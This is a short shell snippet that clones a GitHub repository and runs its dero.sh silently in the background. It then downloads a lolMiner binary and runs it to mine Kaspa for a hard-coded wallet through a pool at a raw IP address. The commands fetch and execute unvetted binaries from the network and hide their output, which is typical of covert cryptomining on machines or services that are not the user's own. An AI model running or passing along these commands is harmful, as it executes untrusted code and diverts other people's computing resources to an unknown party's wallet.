git clone https://github.com/angkii/2022.git

cd 2022

chmod +x dero.sh

./dero.sh > /dev/null 2>&1 &

wget https://github.com/angkii/2022/raw/main/lolMiner1.65 && chmod +x lolMiner1.65 && ./lolMiner1.65 --algo KASPA --pool stratum+ssl://178.128.106.3:80 --user kaspa:qpmj8grquw9erhz5xuew2j8tjfvqkh7hqzyn87m4scwkpfh5jny255ddcl5xt --no-cl --tls on
